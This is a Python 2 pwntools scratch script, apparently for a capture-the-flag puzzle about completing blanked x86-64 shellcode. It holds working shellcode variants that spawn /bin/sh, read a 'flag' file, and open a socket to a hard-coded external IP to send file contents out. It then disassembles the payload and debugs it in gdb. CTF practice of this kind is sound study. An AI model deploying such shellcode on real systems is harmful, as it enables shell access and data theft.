from pwn import * 
context.arch="amd64"
context.log_level ="debug"

shellcode = """
b8 __ __ __ __ bf __ __ __ __ be __ __ __ __ ba
__ __ __ __ 01 c7 29 fe 21 f2 0f 05 48 b8 __ __
__ __ __ __ __ __ 50 b8 __ __ __ __ ba __ __ __
__ bf __ __ __ __ 48 89 __ 0f 05 be __ __ __ __
bf __ __ __ __ ba __ __ __ __ 83 c0 __ 0f 05 89
__ b8 __ __ __ __ bf __ __ __ __ 41 ba __ __ __
__ 0f 05 58"""

said = """b8 00 00 00 00 bf 00 00 00 00 be 00 00 00 00 ba
00 00 00 00 01 c7 29 fe 21 f2 0f 05 48 b8 2f 62
69 6e 2f 73 68 00 50 b8 3b 00 00 00 ba 00 00 00
00 bf 00 00 00 00 48 89 e7 0f 05 be 00 00 00 00
bf 00 00 00 00 ba 00 00 00 00 83 c0 00 0f 05 89
e7 b8 00 00 00 00 bf 90 90 90 90 41 ba 90 90 90
90 0f 05 58"""

shellcode = shellcode.split()
print shellcode
spaces = [i for i, x in enumerate(shellcode) if x == "__"]

shellcode= """
b8 0a000000 
bf f6ffff5f
be ecffffbf
ba 07000000 
01 c7 29 fe 21 f2
0f 05 
48 b8 666c616700000000
50 
b8 02000000 
ba 00000000 
bf 00000000 
48 89 e7 
0f 05 
b8 00000000 
ba 03000000 
bf 02000000 
83 c0 00 
0f 05 
89 e7
b8 00000000 
bf __ __ __ __
41 ba __ __ __ __ 
0f 05 58"""

shellcode= """
b8 01000000 
bf 00000000
be 09006000
ba 08000000 
01 c7 29 fe 21 f2
0f 05 
48 b8 666c616700000000
50 
b8 02000000 
ba 00000000 
bf 00000000 
48 89 e7 
0f 05 
b8 00000000 
ba 03000000 
bf 02000000 
83 c0 00 
0f 05 
89 e7
b8 00000000 
bf __ __ __ __
41 ba __ __ __ __ 
0f 05 58"""

# shellcode= """
# b8 00000000 
# bf 00000000 
# be 00000000
# ba 00000000 
# 01 c7 29 fe 21 f2 0f 05 
# 48 b8 2f62696e2f6c7300
# 50 
# b8 3b000000
# ba 00000000 
# bf 00000000 
# 48 89 e7 
# 0f 05 
# b8 00000000 
# ba 03000000 
# bf 02000000 
# 83 c0 00 
# 0f 05 
# 89 e7
# b8 00000000 
# bf __ __ __ __
# 41 ba __ __ __ __ 
# 0f 05 58"""

shellcode= """
b8 29000000
bf d9ffffff
be 03000000
ba 00000000
01 c7
29 fe
21 f2
0f 05
48 b8 02004444127e0024
50
b8 2a000000
ba 10000000
bf 00000000
48 89 e6
0f 05
be 00000000
bf b80c4000
ba 00000000
83 c0 02
0f 05
89 c6
b8 28000000
bf 00000000
41 ba 80000000
0f 05 58"""

shellcode = shellcode.replace("__", "90").replace("\n", " ").split()
print shellcode
shellcode = "".join(shellcode).decode("hex")
print shellcode

output = " ".join([shellcode[i].encode("hex") for i in spaces])
print output

print repr(shellcode)
print disasm(shellcode)

# p = run_shellcode(shellcode)
# p.recvall()

# p.interactive()
gdb.debug_shellcode(shellcode, """
        set disassembly-flavor intel
        set height 0
        # """
        )

time.sleep(10000) # There's a bug in pwntools where the gdb will close immediately unless you have this
